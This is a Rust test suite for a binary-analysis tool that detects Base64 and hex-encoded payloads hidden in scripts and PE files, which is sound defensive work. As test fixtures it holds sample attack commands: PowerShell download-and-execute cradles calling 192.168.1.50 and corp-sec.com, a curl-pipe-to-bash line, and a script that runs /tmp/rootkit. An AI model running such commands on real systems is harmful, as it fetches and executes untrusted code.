// Licensed under the Apache License, Version 2.0 <LICENSE or
// http://www.apache.org/licenses/LICENSE-2.0>.
// Copyright 2026 GHSFS. See the NOTICE file for attribution details.

use bin_sentinel::carve::{
    carve_payloads_bytes, carve_payloads_file, CarveEncodingKind, CarveOptions, DecodedPayloadKind,
};
use bin_sentinel::pe::{
    build_synthetic_pe64, IMAGE_SCN_CNT_CODE, IMAGE_SCN_CNT_INITIALIZED_DATA,
    IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ,
};
use std::fs;
use std::process::Command;
use tempfile::tempdir;

#[test]
fn test_carve_base64_nested_pe() {
    let code = b"\x48\x89\x5C\x24\x08\x57\x48\x83\xEC\x20\x33\xC0\x48\x83\xC4\x20\x5F\xC3";
    let synthetic_pe = build_synthetic_pe64(&[(
        ".text",
        code,
        IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE,
    )]);
    // Standard Base64 encode the PE binary using zeroize/hex or simple b64 encoder
    let encoded_b64 = to_standard_base64(&synthetic_pe);

    let mut haystack = Vec::new();
    haystack.extend_from_slice(b"var payload = \"");
    haystack.extend_from_slice(encoded_b64.as_bytes());
    haystack.extend_from_slice(b"\";\n// end of script");

    let options = CarveOptions {
        min_length: 20,
        ..Default::default()
    };

    let report = carve_payloads_bytes(&haystack, &options, None).expect("carve payloads");
    assert!(
        report.total_carved >= 1,
        "Expected at least 1 carved payload"
    );
    assert_eq!(report.nested_executables_count, 1);

    let payload = &report.payloads[0];
    assert_eq!(payload.encoding, CarveEncodingKind::StandardBase64);
    assert!(matches!(
        payload.payload_kind,
        DecodedPayloadKind::NestedPe { is_64bit: true, .. }
    ));
    assert!(payload.confidence_score >= 90);
    assert!(payload.decoded_length >= 512);
}

#[test]
fn test_carve_url_safe_base64_powershell() {
    let script = b"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.50/stage2.ps1')\"";
    // Craft URL-safe Base64 with '-' or '_'
    let b64 = to_url_safe_base64(script);

    let mut haystack = Vec::new();
    haystack.extend_from_slice(b"const token = '");
    haystack.extend_from_slice(b64.as_bytes());
    haystack.extend_from_slice(b"';");

    let options = CarveOptions {
        min_length: 24,
        ..Default::default()
    };

    let report = carve_payloads_bytes(&haystack, &options, None).expect("carve url safe");
    assert!(!report.payloads.is_empty(), "Expected carved payload");

    let p = &report.payloads[0];
    assert!(
        p.encoding == CarveEncodingKind::UrlSafeBase64
            || p.encoding == CarveEncodingKind::StandardBase64
    );
    assert!(matches!(
        p.payload_kind,
        DecodedPayloadKind::ScriptPowerShell { .. }
    ));
    assert!(p.summary.to_lowercase().contains("powershell"));
}

#[test]
fn test_carve_contiguous_hex_stream() {
    let raw_script =
        b"#!/bin/bash\ncurl -fsSL https://updates.internal-corp.net/agent.sh | /bin/bash\n";
    let hex_encoded = hex::encode(raw_script);

    let mut haystack = Vec::new();
    haystack.extend_from_slice(b"char payload_hex[] = \"");
    haystack.extend_from_slice(hex_encoded.as_bytes());
    haystack.extend_from_slice(b"\";");

    let options = CarveOptions {
        min_length: 24,
        ..Default::default()
    };

    let report = carve_payloads_bytes(&haystack, &options, None).expect("carve hex stream");
    assert!(!report.payloads.is_empty(), "Expected hex stream carved");

    let p = &report.payloads[0];
    assert_eq!(p.encoding, CarveEncodingKind::ContiguousHex);
    assert!(matches!(
        p.payload_kind,
        DecodedPayloadKind::ScriptShell { .. }
    ));
}

#[test]
fn test_carve_formatted_hex_variants() {
    // Escaped hex \x4d\x5a\x90...
    let mut escaped = String::new();
    for &b in b"powershell -WindowStyle Hidden -Command Invoke-Expression (Get-Content config.txt)"
    {
        escaped.push_str(&format!("\\x{:02x}", b));
    }

    let report = carve_payloads_bytes(escaped.as_bytes(), &CarveOptions::default(), None)
        .expect("carve escaped hex");
    assert!(!report.payloads.is_empty(), "Expected escaped hex payload");
    assert_eq!(report.payloads[0].encoding, CarveEncodingKind::FormattedHex);
    assert!(matches!(
        report.payloads[0].payload_kind,
        DecodedPayloadKind::ScriptPowerShell { .. }
    ));

    // 0x4d, 0x5a format
    let mut comma_hex = String::new();
    for (i, &b) in b"#!/bin/sh\nchmod +x /tmp/rootkit\n/tmp/rootkit\n"
        .iter()
        .enumerate()
    {
        if i > 0 {
            comma_hex.push_str(", ");
        }
        comma_hex.push_str(&format!("0x{:02x}", b));
    }

    let report2 = carve_payloads_bytes(comma_hex.as_bytes(), &CarveOptions::default(), None)
        .expect("carve comma hex");
    assert!(!report2.payloads.is_empty(), "Expected comma hex payload");
    assert_eq!(
        report2.payloads[0].encoding,
        CarveEncodingKind::FormattedHex
    );
}

#[test]
fn test_carve_utf16le_base64_powershell() {
    let script = b"IEX (New-Object Net.WebClient).DownloadString('http://corp-sec.com/payload')";
    let b64 = to_standard_base64(script);

    // Convert b64 string into UTF-16LE bytes
    let mut utf16_bytes = Vec::new();
    for c in b64.bytes() {
        utf16_bytes.push(c);
        utf16_bytes.push(0);
    }

    let mut haystack = Vec::new();
    haystack.extend_from_slice(b"W\0I\0N\0 \0");
    haystack.extend_from_slice(&utf16_bytes);
    haystack.extend_from_slice(b"\0\0");

    let options = CarveOptions {
        min_length: 20,
        ..Default::default()
    };

    let report = carve_payloads_bytes(&haystack, &options, None).expect("carve utf16le");
    assert!(
        !report.payloads.is_empty(),
        "Expected utf16le base64 payload"
    );
    let p = &report.payloads[0];
    assert_eq!(p.encoding, CarveEncodingKind::StandardBase64);
    assert!(matches!(
        p.payload_kind,
        DecodedPayloadKind::ScriptPowerShell { .. } | DecodedPayloadKind::IocNetwork { .. }
    ));
}

#[test]
fn test_carve_pe_section_and_rwx_mapping() {
    let raw_payload = b"powershell -enc JAB4ACAAPQAgADEA";
    let b64 = to_standard_base64(raw_payload);

    // Build synthetic PE with payload in .rdata section
    let code = b"\x48\x89\x5C\x24\x08\x57\x48\x83\xEC\x20\x33\xC0\x48\x83\xC4\x20\x5F\xC3";
    let pe_bytes = build_synthetic_pe64(&[
        (
            ".text",
            code,
            IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE,
        ),
        (
            ".rdata",
            b64.as_bytes(),
            IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ,
        ),
    ]);

    let report = carve_payloads_bytes(&pe_bytes, &CarveOptions::default(), None)
        .expect("carve in pe section");
    assert!(!report.payloads.is_empty(), "Expected carved payload in PE");

    let p = &report.payloads[0];
    assert!(p.section_name.is_some(), "Expected resolved section name");
    assert!(p.rva.is_some(), "Expected resolved RVA");
}

#[test]
fn test_safe_extraction_to_directory() {
    let dir = tempdir().expect("tempdir");
    let target_file = dir.path().join("carrier.bin");

    let nested_script = b"#!/bin/bash\ncurl -O http://example.com/test.bin\n";
    let b64 = to_standard_base64(nested_script);
    fs::write(&target_file, b64.as_bytes()).expect("write target");

    let extract_dir = dir.path().join("extracted_payloads");
    let options = CarveOptions {
        min_length: 16,
        extract_dir: Some(extract_dir.clone()),
        ..Default::default()
    };

    let report = carve_payloads_file(&target_file, &options).expect("carve and extract");
    assert!(!report.payloads.is_empty());
    assert!(extract_dir.exists(), "Extract dir should be created");

    let entries: Vec<_> = fs::read_dir(&extract_dir)
        .expect("read extract dir")
        .filter_map(|e| e.ok())
        .collect();
    assert!(!entries.is_empty(), "Expected extracted files on disk");
    let file_content = fs::read(entries[0].path()).expect("read extracted file");
    assert_eq!(file_content, nested_script);
}

#[test]
fn test_reject_noise_and_false_positives() {
    // Random non-base64 binary data and short repetitive tokens
    let noisy_data = [0x00, 0x01, 0x02, 0x03, 0xFF, 0xFE, 0xFD, 0x00, 0x55, 0xAA];
    let report =
        carve_payloads_bytes(&noisy_data, &CarveOptions::default(), None).expect("carve noise");
    assert_eq!(report.total_carved, 0);

    // Pure zero stream
    let zeros = [0u8; 1024];
    let report_zeros =
        carve_payloads_bytes(&zeros, &CarveOptions::default(), None).expect("carve zeros");
    assert_eq!(report_zeros.total_carved, 0);
}

#[test]
fn test_malformed_and_truncated_resilience() {
    let malformed = b"===VGhpcyBpcyBhIHNob3J0IHRlc3Q===--++//";
    let report =
        carve_payloads_bytes(malformed, &CarveOptions::default(), None).expect("carve malformed");
    // Should safely complete without panic
    let _ = report.total_carved;
}

#[test]
fn test_cli_carve_subcommand_json_and_table() {
    let dir = tempdir().expect("tempdir");
    let test_file = dir.path().join("carrier_test.txt");

    let payload = b"powershell.exe -ExecutionPolicy Bypass -Command Start-Process calc.exe";
    let b64 = to_standard_base64(payload);
    fs::write(&test_file, format!("Payload: {}\n", b64)).expect("write test file");

    let bin_path = env!("CARGO_BIN_EXE_bsentinel");

    // 1. Test table mode
    let output_table = Command::new(bin_path)
        .args(["carve", test_file.to_str().unwrap()])
        .output()
        .expect("execute bsentinel carve table");
    assert!(output_table.status.success());
    let stdout_table = String::from_utf8_lossy(&output_table.stdout);
    assert!(stdout_table.contains("Base64 & Hex Encoded Payload Carving"));
    assert!(stdout_table.contains("Total Carved"));

    // 2. Test JSON mode
    let output_json = Command::new(bin_path)
        .args(["carve", test_file.to_str().unwrap(), "--json"])
        .output()
        .expect("execute bsentinel carve json");
    assert!(output_json.status.success());
    let stdout_json = String::from_utf8_lossy(&output_json.stdout);
    assert!(stdout_json.contains("\"total_carved\""));
    assert!(stdout_json.contains("\"payloads\""));
}

// Helper functions for synthetic test payload generation
fn to_standard_base64(input: &[u8]) -> String {
    const TABLE: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::new();
    let mut i = 0;
    while i < input.len() {
        let b0 = input[i];
        let b1 = if i + 1 < input.len() { input[i + 1] } else { 0 };
        let b2 = if i + 2 < input.len() { input[i + 2] } else { 0 };

        let v0 = (b0 >> 2) as usize;
        let v1 = (((b0 & 0x03) << 4) | (b1 >> 4)) as usize;
        let v2 = (((b1 & 0x0F) << 2) | (b2 >> 6)) as usize;
        let v3 = (b2 & 0x3F) as usize;

        out.push(TABLE[v0] as char);
        out.push(TABLE[v1] as char);
        if i + 1 < input.len() {
            out.push(TABLE[v2] as char);
        } else {
            out.push('=');
        }
        if i + 2 < input.len() {
            out.push(TABLE[v3] as char);
        } else {
            out.push('=');
        }
        i += 3;
    }
    out
}

fn to_url_safe_base64(input: &[u8]) -> String {
    let std = to_standard_base64(input);
    std.replace('+', "-").replace('/', "_")
}
